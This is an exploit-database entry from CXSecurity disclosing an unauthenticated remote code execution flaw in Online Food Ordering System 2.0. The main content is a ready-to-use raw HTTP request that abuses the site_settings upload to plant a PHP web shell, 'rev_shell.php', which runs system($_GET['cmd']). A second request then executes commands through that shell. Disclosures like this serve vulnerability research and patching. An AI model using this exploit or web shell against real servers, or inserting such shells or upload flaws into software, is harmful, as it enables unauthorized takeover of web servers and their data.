---
title: Online Food Ordering System 2.0 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023010015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-12
fetch_date: 2025-10-04T03:36:13.923164
---

# Online Food Ordering System 2.0 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Online Food Ordering System 2.0 Shell Upload** **2023.01.11**  Credit:  **[Hakan Sonay](https://cxsecurity.com/author/Hakan%2BSonay/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: Online Food Ordering System v2 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 01/10/2023
# Exploit Author: Hakan Sonay
# Vendor Homepage: https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=16022&title=Online+Food+Ordering+System+v2+using+PHP8+and+MySQL+Free+Source+Code
# Version: 2.0
# Tested on: Windows 10 / XAMPP
############## Unauthenticated File Upload Request ##############
POST /fos/admin/ajax.php?action=save\_settings HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: \*/\*
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------19276025152284567381240485635
Content-Length: 831
Origin: http://localhost
Connection: close
Referer: http://localhost/fos/admin/index.php?page=site\_settings
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
-----------------------------19276025152284567381240485635
Content-Disposition: form-data; name="name"
Online Food Ordering System V2
-----------------------------19276025152284567381240485635
Content-Disposition: form-data; name="email"
info@sample.com
-----------------------------19276025152284567381240485635
Content-Disposition: form-data; name="contact"
+6948 8542 623
-----------------------------19276025152284567381240485635
Content-Disposition: form-data; name="about"
<p>shell command:</p><p>/assets/img/&lt;file\_name&gt;.php?cmd=whoami</p>
-----------------------------19276025152284567381240485635
Content-Disposition: form-data; name="img"; filename="rev\_shell.php"
Content-Type: text/php
<?php
echo system($\_GET['cmd']);
?>
-----------------------------19276025152284567381240485635--
############## Command Execution Request ##############
http://localhost/fos/assets/img/\*\*\*\*rev\_shell.php?cmd=[Payload]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top